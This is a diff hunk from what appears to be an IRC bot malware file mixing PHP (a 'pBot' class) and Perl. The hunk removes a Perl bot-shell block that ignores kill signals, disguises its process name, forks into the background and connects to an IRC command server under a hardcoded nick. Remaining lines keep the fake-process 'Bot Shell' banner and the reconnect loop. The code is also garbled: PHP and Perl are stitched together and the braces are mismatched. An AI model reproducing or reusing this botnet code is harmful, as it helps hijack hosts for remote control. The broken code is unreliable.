@@ -42,60 +42,10 @@ class pBot
 	        $changed = stream_select($read, $write, $except, 30);
 		if($changed == 0) break;
 	}
-	}
+	{
 my $success = "\n [+] Bot Shell\n [-] Loading Successfully ...\n [-] Process/PID : $fakeproc - $$\n\n";
 my $failed = "\n [?] perl $0 \n\n";
-
-$SIG{'INT'} = 'IGNORE';
-$SIG{'HUP'} = 'IGNORE';
-$SIG{'TERM'} = 'IGNORE';
-$SIG{'CHLD'} = 'IGNORE';
-$SIG{'PS'} = 'IGNORE';
-
-use IO::Socket;
-use Socket;
-use IO::Select;
-chdir("/");
-$servidor="$ARGV[0]" if $ARGV[0];
-$0="$processo"."\0"x16;;
-my $pid=fork;
-exit if $pid;
-die "Problema com o fork: $!" unless defined($pid);
-our %irc_servers;
-our %DCC;
-my $dcc_sel = new IO::Select->new();
-$sel_cliente = IO::Select->new();
-sub sendraw {
-if ($#_ == '1') {
-my $socket = $_[0];
-print $socket "$_[1]\n";
-} else {
-print $IRC_cur_socket "$_[0]\n";
-}
-}
-
-sub conectar {
-my $meunick = Battouz;
-my $servidor_con = irc.otherworlders.org;
-my $porta_con = 6667;
-
-my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
-if (defined($IRC_socket)) {
-$IRC_cur_socket = $IRC_socket;
-
-$IRC_socket->autoflush(1);
-$sel_cliente->add($IRC_socket);
-
-$irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
-$irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
-$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
-$irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
-nick("$meunick");
-sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
-sleep 1;
-}
-}
-
+        }
 my $line_temp;
 while( 1 ) {
 while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
